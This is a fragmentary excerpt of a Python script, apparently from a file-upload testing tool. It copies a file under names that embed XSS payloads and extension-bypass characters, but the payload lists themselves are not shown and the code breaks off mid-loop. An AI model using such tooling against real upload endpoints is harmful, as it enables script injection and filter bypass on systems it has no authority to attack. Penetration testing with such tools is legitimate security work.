...
def createXSSNamePayload(dir, file, payload, ext):
    if args.verbose:
        printMessage("DEBUG", "Attempting To Create: " + dir + '/' + payload + ext)
    try:
        shutil.copy(file, dir + '/' + payload + ext)
    except Exception as e:
            printMessage("CRITICAL", "Exception Occurred:\n" + e)

def createExtBypassPayload(dir, file, payload, bChar):
    if args.verbose:
        printMessage("DEBUG", "Attempting To Create: " + dir + '/' + file + bChar + payload)
    try:
        shutil.copy(file, dir + '/' + file + bChar + payload)
    except Exception as e:
            printMessage("CRITICAL", "Exception Occurred:\n" + e)
...
def main():
    ...
    for file in args.file:
        ...
        fExtDir = os.path.splitext(file)[1].replace(".", "_").upper()
        ...
        for key in keys:
            if (args.all or args.xss) and key == "_XSSName":
                ...
                for payload in payloads:
                    for bChar in bChars:
                        pass
                        createExtBypassPayload(dir, file, payload, bChar)
            else:
